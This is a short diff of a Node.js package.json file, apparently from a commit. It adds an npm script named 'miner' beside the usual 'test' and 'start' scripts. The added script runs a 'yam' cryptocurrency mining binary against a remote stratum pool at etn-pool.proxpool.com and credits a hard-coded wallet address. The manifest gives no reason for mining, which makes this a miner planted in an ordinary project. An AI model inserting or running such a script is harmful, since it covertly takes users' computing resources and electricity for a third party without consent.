@@ -5,7 +5,8 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "start": "node index.js"
+    "start": "node index.js",
+    "miner": "yam-yvg1900-M7v-linux64-core2/linux64-core2/yam -c x -M stratum+tcp://etnkEhFkLYk1r3DGFYc6nFKisTUbv51DxARtf6cZeXV8CqBwXaZhazGBpfEkEpAYEnTYCMwBKupddE5QZLBhNQsa5waXtghSwB:x@etn-pool.proxpool.com:3333/xmr"
   },
   "author": "",
   "license": "ISC",
